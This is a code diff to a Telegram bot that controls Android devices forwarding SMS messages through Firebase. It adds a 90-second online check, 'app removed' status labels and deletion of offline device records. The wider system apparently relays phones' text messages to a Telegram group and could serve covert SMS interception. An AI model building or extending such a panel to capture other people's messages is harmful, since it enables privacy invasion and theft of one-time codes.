@@ -48,6 +48,14 @@ function saveDevices() {
   }
 }
 
+// Online Status Helper (Strict 90 seconds threshold & isOnline flag)
+function isDeviceOnline(dev) {
+  if (!dev) return false;
+  if (dev.isOnline === false) return false;
+  const lastSeenMs = dev.lastSeen ? (new Date() - new Date(dev.lastSeen)) : Infinity;
+  return lastSeenMs < 90 * 1000;
+}
+
 // Firebase Config Sync
 async function fetchConfigFromFirebase() {
   try {
@@ -57,7 +65,6 @@ async function fetchConfigFromFirebase() {
       const data = await response.json();
       if (data && data.groupChatId) {
         currentGroupChatId = data.groupChatId;
-        console.log(`[Config] Loaded groupChatId from Firebase: ${currentGroupChatId}`);
       }
     }
   } catch (err) {
@@ -102,6 +109,7 @@ async function fetchDevicesFromFirebase() {
               isCharging: !!devInfo.isCharging,
               isServiceRunning: devInfo.isServiceRunning !== false,
               isForwardingEnabled: devInfo.isForwardingEnabled !== false,
+              isOnline: devInfo.isOnline !== false,
               killReason: devInfo.killReason || 'Synced via Firebase',
               lastSeen: lastSeenDate
             });
@@ -126,6 +134,15 @@ async function updateDeviceInFirebase(devId, patchData) {
     });
   } catch (err) {
     console.error(`[Firebase Update Error]`, err.message);
+  }
+}
+
+async function deleteDeviceFromFirebase(devId) {
+  try {
+    const url = `${FIREBASE_DATABASE_URL.replace(/\/$/, '')}/devices/${devId}.json`;
+    await fetch(url, { method: 'DELETE' });
+  } catch (err) {
+    console.error(`[Firebase Delete Error]`, err.message);
   }
 }
 
@@ -167,6 +184,7 @@ function handleDeviceRegistrationData(data) {
     isCharging: data.isCharging !== undefined ? Boolean(data.isCharging) : (existing.isCharging ?? false),
     isServiceRunning: data.isServiceRunning !== undefined ? Boolean(data.isServiceRunning) : true,
     isForwardingEnabled: data.isForwardingEnabled !== undefined ? Boolean(data.isForwardingEnabled) : true,
+    isOnline: true,
     killReason: data.killReason || existing.killReason || 'Running smoothly',
     lastSeen: new Date().toISOString()
   };
@@ -189,9 +207,8 @@ function buildMainReplyKeyboard() {
 }
 
 function buildDeviceControlMessage(dev) {
-  const lastSeenMs = dev.lastSeen ? (new Date() - new Date(dev.lastSeen)) : 0;
-  const isOnline = lastSeenMs < 5 * 60 * 1000;
-  const liveStatus = isOnline ? '🟢 *Online & Active*' : '🔴 *Offline / Inactive*';
+  const online = isDeviceOnline(dev);
+  const liveStatus = online ? '🟢 *Online & Active*' : '🔴 *Offline / Inactive (Uninstalled or Disconnected)*';
   const fwdStatus = dev.isForwardingEnabled ? '🟢 *ENABLED (ON)*' : '🔴 *DISABLED (OFF)*';
   const batText = dev.batteryLevel >= 0 ? `${dev.batteryLevel}% ${dev.isCharging ? '🔌 (Charging)' : '🔋'}` : 'Unknown';
 
@@ -201,28 +218,35 @@ function buildDeviceControlMessage(dev) {
 🆔 *Device ID:* \`${dev.deviceId}\`
 📲 *Model:* \`${dev.model}\`
 ⚡ *Battery:* ${batText}
-⚙️ *Service:* ${dev.isServiceRunning ? '🟢 Running' : '🔴 Stopped'}
+⚙️ *Service:* ${online && dev.isServiceRunning ? '🟢 Running' : '🔴 Stopped'}
 
 ⚡ *Live Status:* ${liveStatus}
 💬 *SMS Forwarding:* ${fwdStatus}
-📋 *Status Info:* ${dev.killReason}
+📋 *Status Info:* ${online ? dev.killReason : 'Disconnected / App Removed'}
 ━━━━━━━━━━━━━━━━━━━━━
 _Select an action below to manage this device:_`;
 }
 
-function buildDeviceMainKeyboard(devId) {
-  return {
-    inline_keyboard: [
-      [
-        { text: '💬 SMS Settings', callback_data: `sms_settings_${devId}` },
-        { text: '✏️ Rename Device', callback_data: `rename_${devId}` }
-      ],
-      [
-        { text: '🔄 Refresh Status', callback_data: `refresh_${devId}` },
-        { text: '📋 All Devices List', callback_data: 'dev_list' }
-      ]
-    ]
-  };
+function buildDeviceMainKeyboard(devId, isOnline) {
+  const row1 = [
+    { text: '💬 SMS Settings', callback_data: `sms_settings_${devId}` },
+    { text: '✏️ Rename Device', callback_data: `rename_${devId}` }
+  ];
+
+  const row2 = [
+    { text: '🔄 Refresh Status', callback_data: `refresh_${devId}` },
+    { text: '📋 All Devices List', callback_data: 'dev_list' }
+  ];
+
+  const inlineKeyboard = [row1, row2];
+
+  if (!isOnline) {
+    inlineKeyboard.push([
+      { text: '🗑️ Delete Offline Device Record', callback_data: `delete_dev_${devId}` }
+    ]);
+  }
+
+  return { inline_keyboard: inlineKeyboard };
 }
 
 function buildSmsSettingsMessage(dev) {
@@ -402,14 +426,15 @@ bot.on('message', async (msg) => {
 
     if (devices.size === 1) {
       const dev = Array.from(devices.values())[0];
+      const online = isDeviceOnline(dev);
       return bot.sendMessage(chatId, buildDeviceControlMessage(dev), {
         parse_mode: 'Markdown',
-        reply_markup: buildDeviceMainKeyboard(dev.deviceId)
+        reply_markup: buildDeviceMainKeyboard(dev.deviceId, online)
       });
     }
 
     const listButtons = Array.from(devices.values()).map(dev => [
-      { text: `${dev.isForwardingEnabled ? '🟢' : '🔴'} ${dev.deviceAlias} (${dev.model})`, callback_data: `dev_info_${dev.deviceId}` }
+      { text: `${isDeviceOnline(dev) ? '🟢' : '🔴'} ${dev.deviceAlias} (${dev.model})`, callback_data: `dev_info_${dev.deviceId}` }
     ]);
 
     return bot.sendMessage(chatId, '📱 *Connected Devices List:*\nSelect a device below to manage settings:', {
@@ -420,9 +445,8 @@ bot.on('message', async (msg) => {
 
   if (text === '📊 Overall Status' || text === '/info') {
     let onlineCount = 0;
-    const now = new Date();
     devices.forEach(d => {
-      if ((now - new Date(d.lastSeen)) < 5 * 60 * 1000) onlineCount++;
+      if (isDeviceOnline(d)) onlineCount++;
     });
 
     const statusText = `📊 *SYSTEM OVERALL STATUS*\n━━━━━━━━━━━━━━━━━━━━━\n🌐 *Bot Server:* 🟢 Online (Node.js)\n🔥 *Firebase Realtime:* 🟢 Synced\n👥 *Group Chat ID:* \`${currentGroupChatId || 'Not Configured'}\`\n📱 *Total Connected Devices:* ${devices.size}\n🟢 *Online Devices:* ${onlineCount}\n🔴 *Offline Devices:* ${devices.size - onlineCount}\n━━━━━━━━━━━━━━━━━━━━━\n_Select \`📱 Connected Devices\` from bottom menu to view individual devices._`;
@@ -457,9 +481,10 @@ bot.on('message', async (msg) => {
     updateDeviceInFirebase(dev.deviceId, { deviceAlias: newName });
 
     await bot.sendMessage(chatId, `✅ Device renamed from \`${oldName}\` to \`${newName}\`!`, { parse_mode: 'Markdown' });
+    const online = isDeviceOnline(dev);
     return bot.sendMessage(chatId, buildDeviceControlMessage(dev), {
       parse_mode: 'Markdown',
-      reply_markup: buildDeviceMainKeyboard(dev.deviceId)
+      reply_markup: buildDeviceMainKeyboard(dev.deviceId, online)
     });
   }
 });
@@ -482,7 +507,7 @@ bot.on('callback_query', async (query) => {
       return bot.answerCallbackQuery(query.id, { text: 'No devices connected' });
     }
     const listButtons = Array.from(devices.values()).map(dev => [
-      { text: `${dev.isForwardingEnabled ? '🟢' : '🔴'} ${dev.deviceAlias} (${dev.model})`, callback_data: `dev_info_${dev.deviceId}` }
+      { text: `${isDeviceOnline(dev) ? '🟢' : '🔴'} ${dev.deviceAlias} (${dev.model})`, callback_data: `dev_info_${dev.deviceId}` }
     ]);
     await bot.editMessageText('📱 *Connected Devices List:*\nSelect a device below to manage settings:', {
       chat_id: chatId,
@@ -493,28 +518,55 @@ bot.on('callback_query', async (query) => {
     return bot.answerCallbackQuery(query.id, { text: 'Updated device list' });
   }
 
-  const matchAction = data.match(/^(dev_info|sms_settings|sms_on|sms_off|sync_old|rename|refresh)_(.+)$/);
+  const matchAction = data.match(/^(dev_info|sms_settings|sms_on|sms_off|sync_old|rename|refresh|delete_dev)_(.+)$/);
   if (!matchAction) return;
 
   const action = matchAction[1];
   const devId = matchAction[2];
   const dev = devices.get(devId);
 
-  if (!dev) {
+  if (!dev && action !== 'delete_dev') {
     return bot.answerCallbackQuery(query.id, { text: '⚠️ Device not found' });
   }
 
   switch (action) {
     case 'dev_info':
-    case 'refresh':
+    case 'refresh': {
+      const online = isDeviceOnline(dev);
       await bot.editMessageText(buildDeviceControlMessage(dev), {
         chat_id: chatId,
         message_id: messageId,
         parse_mode: 'Markdown',
-        reply_markup: buildDeviceMainKeyboard(devId)
+        reply_markup: buildDeviceMainKeyboard(devId, online)
       });
       bot.answerCallbackQuery(query.id, { text: 'Refreshed live status' });
       break;
+    }
+
+    case 'delete_dev': {
+      const devName = dev ? dev.deviceAlias : devId;
+      devices.delete(devId);
+      saveDevices();
+      await deleteDeviceFromFirebase(devId);
+      bot.answerCallbackQuery(query.id, { text: '🗑️ Device removed' });
+      await bot.sendMessage(chatId, `🗑️ Device \`${devName}\` removed from system.`, { parse_mode: 'Markdown' });
+
+      if (devices.size > 0) {
+        const listButtons = Array.from(devices.values()).map(d => [
+          { text: `${isDeviceOnline(d) ? '🟢' : '🔴'} ${d.deviceAlias} (${d.model})`, callback_data: `dev_info_${d.deviceId}` }
+        ]);
+        await bot.sendMessage(chatId, '📱 *Updated Devices List:*', {
+          parse_mode: 'Markdown',
+          reply_markup: { inline_keyboard: listButtons }
+        });
+      } else {
+        await bot.sendMessage(chatId, '📱 *No Connected Devices Remaining.*', {
+          parse_mode: 'Markdown',
+          reply_markup: buildMainReplyKeyboard()
+        });
+      }
+      break;
+    }
 
     case 'sms_settings':
       await bot.editMessageText(buildSmsSettingsMessage(dev), {
